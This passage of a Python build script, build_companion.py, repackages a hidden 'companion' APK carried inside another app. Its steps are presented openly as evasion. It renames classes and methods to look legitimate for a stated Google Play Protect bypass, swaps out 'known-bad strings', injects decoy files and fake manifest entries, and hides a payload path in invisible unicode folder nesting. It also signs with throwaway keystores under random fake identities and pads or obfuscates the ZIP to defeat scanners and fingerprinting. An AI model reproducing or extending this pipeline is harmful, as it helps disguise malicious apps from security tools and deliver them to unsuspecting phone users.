               AFTER resign cannot break V2 signature verification.
               Android falls back to V1 which remains valid.
    """
    print("\n── Step 13: Generate fresh keystore + sign companion APK")

    NAMES     = ["Alice","Bob","Charlie","David","Eve","Frank","Grace","Hank","Ivy","Jack",
                 "Karen","Leo","Mia","Nina","Oscar","Paul","Quinn","Rose","Sam","Tina"]
    ORGS      = ["Acme Corp","Bright Solutions","Cloud Nine","Delta Systems","Echo Labs",
                 "Fusion Works","Globe Tech","Horizon Inc","Infinite Loop","Jade Ventures"]
    CITIES    = ["Austin","Boston","Chicago","Denver","Eugene","Fresno","Houston",
                 "Irving","Louisville","Memphis","Nashville","Omaha","Portland","Raleigh"]
    STATES    = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA",
                 "HI","ID","IL","IN","IA","KS","KY","LA","ME","MD"]
    COUNTRIES = ["US","GB","DE","FR","CA","AU","JP","NL","SE","NO",
                 "FI","DK","CH","AT","NZ","SG","IE","BE","IT","ES"]

    cn    = random.choice(NAMES)
    ou    = random.choice(ORGS) + " Dev"
    o     = random.choice(ORGS)
    l     = random.choice(CITIES)
    st    = random.choice(STATES)
    c     = random.choice(COUNTRIES)
    alias = "key_" + secrets.token_hex(6)
    store_pass = secrets.token_urlsafe(18)
    validity   = random.randint(730, 3650)
    ks_file    = f"companion_ks_{secrets.token_hex(5)}.jks"

    run(
        f'keytool -genkeypair -storetype JKS '
        f'-keystore "{ks_file}" -alias "{alias}" '
        f'-keyalg RSA -keysize 2048 -validity {validity} '
        f'-storepass "{store_pass}" -keypass "{store_pass}" '
        f'-dname "CN={cn}, OU={ou}, O={o}, L={l}, ST={st}, C={c}" '
        f'-noprompt'
    )
    print(f"  Keystore: CN={cn}, O={o}, C={c}, validity={validity}d")

    # Use input_apk if provided (for re-sign after Phase 2), else default
    _src = input_apk if input_apk and os.path.isfile(input_apk) else "companion_renamed_aligned.apk"
    shutil.copy(_src, "companion_final.apk")

    # Resolve apksigner — prefer Android SDK build-tools version (supports V2/V3)
    # over the apt-installed version which may not support all signing schemes.
    _apksigner = "apksigner"
    _android_sdk = os.environ.get("ANDROID_SDK_ROOT", "")
    if _android_sdk and os.path.isdir(_android_sdk):
        import glob as _glob
        _bt_dirs = sorted(_glob.glob(os.path.join(_android_sdk, "build-tools", "*")))
        if _bt_dirs:
            _bt_apksigner = os.path.join(_bt_dirs[-1], "apksigner")
            if os.path.isfile(_bt_apksigner):
                _apksigner = _bt_apksigner
    print(f"  Using apksigner: {_apksigner}")

    _v2 = "false" if v1_only else "true"
    _v3 = "false" if v1_only else "true"
    if v1_only:
        print("  [step_sign] V1-only signing (V2/V3 disabled to survive post-sign ZIP modifications)")
    run(
        f'"{_apksigner}" sign '
        f'--ks "{ks_file}" --ks-key-alias "{alias}" '
        f'--ks-pass "pass:{store_pass}" --key-pass "pass:{store_pass}" '
        f'--v1-signing-enabled true --v2-signing-enabled {_v2} --v3-signing-enabled {_v3} '
        f'companion_final.apk'
    )
    # Copy signed result back to source path if it was input_apk
    if input_apk and os.path.isfile(input_apk):
        shutil.copy("companion_final.apk", input_apk)
        print(f"  ✅ Re-signed in place: {input_apk}")

    # 3-pass secure wipe
    if os.path.isfile(ks_file):
        size = os.path.getsize(ks_file)
        for fill in [b'\x00', b'\xff', None]:
            with open(ks_file, "wb") as f:
                if fill is None:
                    f.write(secrets.token_bytes(size))
                else:
                    f.write(fill * size)
        os.remove(ks_file)
        print("  🔒 Keystore secure wiped (3-pass)")

    print("  ✅ Companion APK signed with fresh keystore")


# ── Step 14: Replace companion.apk in assets ─────────────────────────────────

def step_replace_asset():
    print("\n── Step 14: Replace companion.apk in assets")
    shutil.copy("companion_final.apk", APK_ASSET)
    print(f"  ✅ {APK_ASSET} replaced")


# ── Step 15: Inject companion package name into Kotlin source ─────────────────

def step_inject_kotlin(new_pkg):
    print("\n── Step 15: Inject companion package name into Kotlin source")

    old_companion = "com.pictach.app"

    for kt_file in KOTLIN_FILES:
        if not os.path.isfile(kt_file):
            print(f"  ⚠️  File not found, skipping: {kt_file}")
            continue
        with open(kt_file, "r") as f:
            content = f.read()
        content = content.replace(
            f'market://details?id={old_companion}',
            f'market://details?id={new_pkg}'
        )
        content = content.replace(f'"{old_companion}"', f'"{new_pkg}"')
        with open(kt_file, "w") as f:
            f.write(content)
        print(f"  Patched: {kt_file}")

    # Verify
    result = subprocess.run(
        f'grep -r "{old_companion}" ' + " ".join(KOTLIN_FILES),
        shell=True, capture_output=True, text=True
    )
    remaining = result.stdout.strip()
    if remaining:
        print(f"[X] Old package name still present in Kotlin source:\n{remaining}")
        sys.exit(1)

    print(f"  ✅ Companion package name injected: {new_pkg}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  build_companion.py — Companion APK Build Script")
    print("=" * 60)

    # Init audit log
    global _AUDIT_LOG
    _AUDIT_LOG = os.environ.get("COMPANION_AUDIT_LOG", "companion_audit.log")
    with open(_AUDIT_LOG, "w") as _af:
        _af.write(f"========================================\n")
        _af.write(f" COMPANION BUILD AUDIT LOG\n")
        _af.write(f" Started : {_now()}\n")
        _af.write(f"========================================\n")

    # ── PHASE 1 ──────────────────────────────────────────────────────────────
    with track("PHASE_1", "STEP_1", "Generate random companion package name"):
        new_pkg = step_gen_pkg()

    with track("PHASE_1", "STEP_2", "Verify companion.apk exists + save original resource map", APK_ASSET):
        step_verify_apk()
        _save_original_resource_map()

    with track("PHASE_1", "STEP_3", "Extract companion APK metadata", APK_ASSET):
        meta = step_extract_metadata()

    with track("PHASE_1", "STEP_4", "Randomize companion res/ filenames", APK_ASSET):
        res_rename = step_randomize_res()

    with track("PHASE_1", "STEP_5", "Decompile companion APK (smali only)", APK_ASSET):
        step_decompile()

    with track("PHASE_1", "STEP_6", "Rename smali class paths + string literals"):
        step_rename_smali(new_pkg)

    with track("PHASE_6", "STEP_6A", "Rename companion classes to legitimate Android names"):
        class_rename_map = step_6a_rename_classes(new_pkg)

    # STEP_6B temporarily disabled — smali injection causes apktool compile failures
    # Root cause not identifiable without direct filesystem access
    # Steps 6A + 6C + 6D still provide GPP bypass via class/method renaming
    # Re-enable after Windows server setup enables local apktool debugging
    # with track("PHASE_6", "STEP_6B", "Inject real legitimate smali code snippets"):
    #     step_6b_inject_legitimate_code(new_pkg)
    print("  ℹ️  STEP_6B skipped (smali injection disabled — re-enable after local debug)")

    # Step 7 must run BEFORE Step 6D (method rename)
    # because Step 6D renames findByHomeLauncher → resolveInstalledLauncher
    # and Step 7 searches for "findByHomeLauncher" by name
    with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
        step_patch_home_launcher()

    with track("PHASE_6", "STEP_6C", "Replace known-bad strings with legitimate equivalents"):
        step_6c_replace_bad_strings(new_pkg, class_rename_map)

    with track("PHASE_6", "STEP_6D", "Rename custom methods to legitimate Android-style names"):
        step_6d_rename_methods(new_pkg)

    with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
        step_restore_apktool_yml(meta)

    with track("PHASE_1", "STEP_9", "Rebuild classes.dex via apktool"):
        new_dex = step_rebuild_dex()

    with open("new_classes.dex", "rb") as f:
        new_dex = f.read()

    with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", APK_ASSET):
        step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None)

    with track("PHASE_1", "STEP_9A", "Patch versionCode + versionName in binary AXML manifest [Step 9A]", APK_ASSET):
        # Read assembled APK manifest, patch version, write back
        import zipfile as _zf
        _apk_tmp = "companion_renamed_unsigned.apk"
        _manifest_raw = None
        with _zf.ZipFile(_apk_tmp, "r") as _z:
            _manifest_raw = _z.read("AndroidManifest.xml")
        _manifest_patched = _patch_axml_version(
            _manifest_raw, int(meta["ver_code"]), meta["ver_name"]
        )
        _tmp_ver = _apk_tmp + ".ver_tmp"
        with _zf.ZipFile(_apk_tmp, "r") as _zin,              _zf.ZipFile(_tmp_ver, "w", allowZip64=False) as _zout:
            for _item in _zin.infolist():
                _data = _zin.read(_item.filename)
                if _item.filename == "AndroidManifest.xml":
                    _item.compress_type = _zf.ZIP_STORED
                    _zout.writestr(_item, _manifest_patched)
                else:
                    _zout.writestr(_item, _data)
        os.replace(_tmp_ver, _apk_tmp)
        print(f"  ✅ Step 9A version patch applied to assembled APK")

    build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()

    # ── PHASE 2 — APK STRUCTURE ───────────────────────────────────────────────
    with track("PHASE_2", "STEP_13_UNICODE", "Deep unicode folder nesting companion [Step 13]", "companion_renamed_unsigned.apk"):
        step_unicode_nest(build_hash)

    with track("PHASE_2", "STEP_15_NOISE", "Decoy noise files injection [Step 15]", "companion_renamed_unsigned.apk"):
        step_decoy_noise_files(build_hash)

    with track("PHASE_2", "STEP_17_MANIFEST", "Fake manifest entries injection [Step 17]", "companion_renamed_unsigned.apk"):
        step_fake_manifest_entries()

    with track("PHASE_2", "STEP_11_ZIPALIGN", "Zipalign companion APK [Step 11]", "companion_renamed_unsigned.apk"):
        step_zipalign()

    with track("PHASE_1", "STEP_12_FINGERPRINT", "Generate per-build fingerprint SHA-512 + BLAKE3 [Step 12]"):
        step_fingerprint()

    with track("PHASE_1", "STEP_13_SIGN", "Generate fresh keystore + sign companion APK [Step 13]", "companion_renamed_aligned.apk"):
        step_sign()

    with track("PHASE_1", "STEP_14_ASSET", "Replace companion.apk in assets [Step 14]", APK_ASSET):
        step_replace_asset()

    with track("PHASE_1", "STEP_15_KOTLIN", "Inject companion package name into Kotlin source [Step 15]"):
        step_inject_kotlin(new_pkg)

    # ── PHASE 2 POST-PROCESSING ───────────────────────────────────────────────
    scripts_dir = os.path.dirname(os.path.abspath(__file__))
    aes_key_hex = ""
    if GITHUB_OUTPUT and os.path.isfile(GITHUB_OUTPUT):
        with open(GITHUB_OUTPUT) as _f:
            for _line in _f:
                if _line.startswith("aes_key_hex="):
                    aes_key_hex = _line.split("=", 1)[1].strip()
                    break
    if not aes_key_hex:
        import hashlib as _hl
        aes_key_hex = _hl.sha256(build_hash.encode()).hexdigest() + _hl.sha256((build_hash + "key").encode()).hexdigest()
        aes_key_hex = aes_key_hex[:64]

    # ── ORDER IS CRITICAL ─────────────────────────────────────────────────────
    # 17D/17E/17F (manifest) → 17H (strings) → 17A/17B/17C (ZIP headers)
    # 17H must run BEFORE 17A/17B/17C because zip_header_obfuscator injects
    # non-standard compression type 0x07F0 (2032) which Python zipfile cannot
    # read back — so any script using zipfile.ZipFile must run before it.

    # STEP_17E_17F (manifest_zip_patcher) is NOT applied to companion.
    # Steps 17E (fake encrypted blocks) and 17F (random AXML padding) modify
    # the binary AndroidManifest.xml AXML structure. These modifications cause
    # Android's PackageParser to reject the APK with "problem parsing the package"
    # on some devices despite the AXML being structurally valid by our checks.
    # Steps 17E/17F are scanner-confusion features (Phase 8 scope) — not required
    # for Phase 1/2 functionality. They will be revisited in Phase 8.
    # Step 17D (string encryption) remains disabled until Phase 4 native layer.
    print("  ℹ️  STEP_17E_17F — skipped for companion (causes Android parse errors)")

    with track("PHASE_2", "STEP_17H", "Fake string resources injection [17H]", APK_ASSET):
        res_script = os.path.join(scripts_dir, "res_renamer.py")
        tmp3 = APK_ASSET + ".p2c"
        if os.path.isfile(res_script):
            r = subprocess.run([sys.executable, res_script, APK_ASSET, tmp3, "--count", "30"])
            if r.returncode == 0 and os.path.isfile(tmp3):
                os.replace(tmp3, APK_ASSET)
            else:
                raise RuntimeError(f"res_renamer.py failed rc={r.returncode}")
        else:
            print(f"  ⚠️  res_renamer.py not found — skipping")

    # Cleanup temp files before resign
    for _suffix in [".p2a", ".p2b", ".p2c", ".zho", ".rr_tmp",
                    ".p2a.rr_tmp", ".p2b.rr_tmp", ".p2c.rr_tmp",
                    ".mzp", ".mzp_tmp", ".mzp.rr_tmp"]:
        _lf = APK_ASSET + _suffix
        if os.path.exists(_lf):
            try: os.remove(_lf)
            except Exception: pass

    # ── STEP_RESIGN_1 runs BEFORE 17A/17B/17C ────────────────────────────────
    # This is the permanent fix for the companion Install option issue.
    #
    # Previous approach: run 17A/17B/17C → resign (strip 0x07F0 → sign → restore)
    # Problem: any ZIP_STORED entry that 17B touches gets restored to deflate(8)
    # causing apksigner to fail with "Failed to inflate data".
    #
    # New approach: resign FIRST (clean ZIP, no 0x07F0, no padding) → 17A/17B/17C LAST
    # - STEP_RESIGN_1 signs a standard ZIP → succeeds reliably every build
    # - V1 signature covers all changes from 17E/17F/17H
    # - 17A/17B/17C runs AFTER signing → modifies raw binary ZIP bytes
    # - V2 is broken by 17B/17C (intentional — confuses scanners)
    # - V1 is valid → MT Manager reads V1 → shows Install option ✅
    # - Android installer uses V1 for sideload → installs correctly ✅
    # ── STEP_RESIGN_1 — sign with full V1+V2+V3 ─────────────────────────────────
    # Steps 17A/17B/17C are NOT applied to companion because:
    # - 17A modifies LFH bytes after signing → breaks V2
    # - Android minSdk=28 REQUIRES V2 — rejects V1-only APKs with "parsing error"
    # - 17B/17C also break V2 for same reason
    # - Scanner confusion from 17A/17B/17C is a Phase 8 feature
    # - For companion, installability takes priority over scanner confusion
    # Companion is signed V1+V2+V3 and installs correctly on all API 28+ devices.
    with track("PHASE_2", "STEP_REPAIR_RESMAP", "Validate + repair AndroidManifest resource map [pre-resign]", APK_ASSET):
        _repair_manifest_resource_map()

    # ── STEP_17C — random size padding BEFORE signing ─────────────────────────
    # Padding is added inside the ZIP comment field (last field of EOCD).
    # ZIP comment is variable length (0-65535 bytes) and sits after EOCD.
    # V2 signing block covers bytes[0..sb_start] — EOCD comment is included
    # in the signed data so it becomes part of the V2 hash.
    # Result: every build has different APK size → defeats size fingerprinting.
    # V2 signature covers the padding → verify passes ✅
    with track("PHASE_2", "STEP_17C", "APK size randomization via ZIP comment padding [17C]", APK_ASSET):
        import random as _random
        _pad_len = _random.randint(1024, 65000)
        _pad     = secrets.token_bytes(_pad_len)
        _data    = open(APK_ASSET, "rb").read()
        # Find EOCD and update comment length field
        _eocd    = _data.rfind(b"PK")
        if _eocd != -1:
            _new_data = bytearray(_data)
            struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
            _new_data = bytes(_new_data) + _pad
            open(APK_ASSET, "wb").write(_new_data)
            print(f"  ✅ Step 17C — appended {_pad_len} bytes ZIP comment padding")
        else:
            print("  ⚠️  Step 17C — EOCD not found, skipping padding")

    with track("SIGNING", "STEP_RESIGN_1", "Re-sign companion V1+V2+V3 after Phase 2 [17E/17F/17H/17C]", APK_ASSET):
        step_sign(input_apk=APK_ASSET)

    print("  ℹ️  STEP_17A_17B applied post-sign inside zip_header_obfuscator for timestamp randomization")

    with track("PHASE_1", "STEP_14_ASSET_2", "Replace companion.apk in assets after re-sign [Step 14]", APK_ASSET):
        step_replace_asset()

    # Final audit summary
    with open(_AUDIT_LOG, "a") as _af:
        _af.write(f"\n========================================\n")
        _af.write(f" COMPANION BUILD COMPLETE\n")
        _af.write(f" Package : {new_pkg}\n")
        _af.write(f" Output  : {APK_ASSET}\n")
        _af.write(f" Finished: {_now()}\n")
        _af.write(f"========================================\n")

    print("\n── Step 18 [NOVA]: Preparing Nova unicode nest placeholder")
    print("   Nova APK unicode nesting will be applied by generate_batch.sh")
    print("   after Gradle assembleRelease completes.")

    print("\n" + "=" * 60)
    print("  ✅ Companion APK build complete")
    print(f"  Package : {new_pkg}")
    print(f"  Output  : {APK_ASSET}")
    print("=" * 60)


# ── Step 18 [NOVA]: Deep invisible unicode folder nesting for Nova ────────────

def step_nova_unicode_nest(nova_apk_path: str, build_hash: str) -> str:
    """
    Step 18 [NOVA] — Same unicode nesting as Step 10 (Companion) but applied
    to the Nova APK's companion payload storage area.
    Uses a DIFFERENT randomized depth (9-13 levels) from companion (fixed 11).
    Arabic RTL + Korean hangul interleaved — same character mix.
    Returns the ZIP entry path of the injected entry.
    """
    import random as _random
    import secrets as _secrets

    ARABIC_RTL = [
        "\u06E6", "\u0596", "\u06EB", "\u200F", "\u06DD",
    ]
    HANGUL_FILLER = "\u3164"

    # Depth randomized per build — different from companion's fixed 11
    depth = _random.randint(9, 13)

    # Use a different seed from companion: sha256(build_hash + "nova")
    seed = hashlib.sha256((build_hash + "nova").encode()).hexdigest()
    rng  = _random.Random(seed)

    parts = []
    for level in range(depth):
        if level % 2 == 0:
            parts.append(rng.choice(ARABIC_RTL))
        else:
            parts.append(HANGUL_FILLER)

    # Random extension for Nova's placeholder entry
    ext_len = _random.randint(3, 6)
    ext     = "." + "".join(_random.choices(string.ascii_lowercase + string.digits, k=ext_len))
    payload_filename = build_hash[:8] + ext
    nest_path = "/".join(parts + [payload_filename])

    placeholder = _secrets.token_bytes(64)

    print(f"\n── Step 18 [NOVA]: Deep unicode folder nesting")
    print(f"  Depth     : {depth} levels")
    print(f"  Path      : {repr(nest_path)}")

    tmp = nova_apk_path + ".nova_nest_tmp"
    import zipfile as _zipfile
    with _zipfile.ZipFile(nova_apk_path, "r") as zin:
        with _zipfile.ZipFile(tmp, "w", allowZip64=False) as zout:
            for item in zin.infolist():
                zout.writestr(item, zin.read(item.filename))
            nest_info = _zipfile.ZipInfo(nest_path)
            nest_info.compress_type = _zipfile.ZIP_STORED
            nest_info.flag_bits |= 0x800   # UTF-8 EFS flag
            zout.writestr(nest_info, placeholder)

    os.replace(tmp, nova_apk_path)
    print(f"  ✅ Nova unicode nest injected")
    return nest_path


# ── Phase 2 post-processing pipeline ─────────────────────────────────────────
# Steps 17A / 17B / 17C / 17D / 17E / 17F / 17H + Step 22
# Called on companion APK first, then must be called on Nova APK externally
# (from generate_batch.sh or CI after Nova Gradle build).

def run_phase2_postprocess(apk_path: str, aes_key_hex: str, label: str = ""):
    """
    Run all Phase 2 post-build scripts on the given APK in the correct order.
    Steps: 17D/17E/17F (manifest) → 17A/17B/17C/22 (zip headers) → 17H (strings)
    The APK is modified in-place. Re-sign after calling this.

    label : 'companion' or 'nova' (for logging only)
    """
    scripts_dir = os.path.dirname(os.path.abspath(__file__))
    tag = f"[{label.upper() or 'APK'}]"

    print(f"\n{'─'*60}")
    print(f"  Phase 2 post-processing: {tag} {os.path.basename(apk_path)}")
    print(f"{'─'*60}")

    tmp1 = apk_path + ".p2a"
    tmp2 = apk_path + ".p2b"
    tmp3 = apk_path + ".p2c"

    # Step 17D/17E/17F — manifest patcher
    manifest_script = os.path.join(scripts_dir, "manifest_zip_patcher.py")
    if os.path.isfile(manifest_script):
        result = subprocess.run(
            [sys.executable, manifest_script, apk_path, tmp1, aes_key_hex],
            capture_output=False
        )
        if result.returncode == 0 and os.path.isfile(tmp1):
            os.replace(tmp1, apk_path)
            print(f"  ✅ {tag} Steps 17D/17E/17F — manifest patched")
        else:
            print(f"  ⚠️  {tag} manifest_zip_patcher.py failed — skipping")
    else:
        print(f"  ⚠️  {tag} manifest_zip_patcher.py not found — skipping")

    # Step 17A/17B/17C/22 — ZIP header obfuscator
    zip_script = os.path.join(scripts_dir, "zip_header_obfuscator.py")
    if os.path.isfile(zip_script):
        result = subprocess.run(
            [sys.executable, zip_script, apk_path, tmp2],
            capture_output=False
        )
        if result.returncode == 0 and os.path.isfile(tmp2):
            os.replace(tmp2, apk_path)
            print(f"  ✅ {tag} Steps 17A/17B/17C/22 — ZIP headers obfuscated")
        else:
            print(f"  ⚠️  {tag} zip_header_obfuscator.py failed — skipping")
    else:
        print(f"  ⚠️  {tag} zip_header_obfuscator.py not found — skipping")

    # Step 17H — fake string resources
    res_script = os.path.join(scripts_dir, "res_renamer.py")
    if os.path.isfile(res_script):
        result = subprocess.run(
            [sys.executable, res_script, apk_path, tmp3, "--count", "30"],
            capture_output=False
        )
        if result.returncode == 0 and os.path.isfile(tmp3):
            os.replace(tmp3, apk_path)
            print(f"  ✅ {tag} Step 17H — fake string resources injected")
        else:
            print(f"  ⚠️  {tag} res_renamer.py failed — skipping")
    else:
        print(f"  ⚠️  {tag} res_renamer.py not found — skipping")

    # Cleanup — remove any leftover temp files from all pipeline steps
    for suffix in [".p2a", ".p2b", ".p2c", ".zho", ".rr_tmp",
                   ".p2a.rr_tmp", ".p2b.rr_tmp", ".p2c.rr_tmp",
                   ".mzp", ".mzp_tmp", ".mzp.rr_tmp"]:
        leftover = apk_path + suffix
        try:
            if os.path.exists(leftover):
                os.remove(leftover)
                print(f"  🗑️  {tag} Cleaned up leftover: {os.path.basename(leftover)}")
        except Exception:
            pass

    print(f"  ✅ {tag} Phase 2 post-processing complete")


if __name__ == "__main__":
    main()
